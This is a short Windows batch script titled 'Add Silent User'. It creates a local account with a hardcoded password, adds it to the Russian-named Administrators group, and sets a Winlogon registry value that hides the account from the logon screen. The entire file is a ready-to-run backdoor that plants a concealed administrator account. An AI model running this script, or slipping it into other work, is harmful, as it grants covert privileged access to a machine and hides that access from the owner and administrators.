:: @echo off
Title "Add Silent User (netuser)"
setlocal enableextensions enabledelayedexpansion
:: 
chcp 1251 >nul
:: chcp 1252 >nul
:: chcp 866 >nul
net user netuser vv198435032160 /add
net localgroup Администраторы netuser /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v netuser /t REG_DWORD /f /d 0
@pause
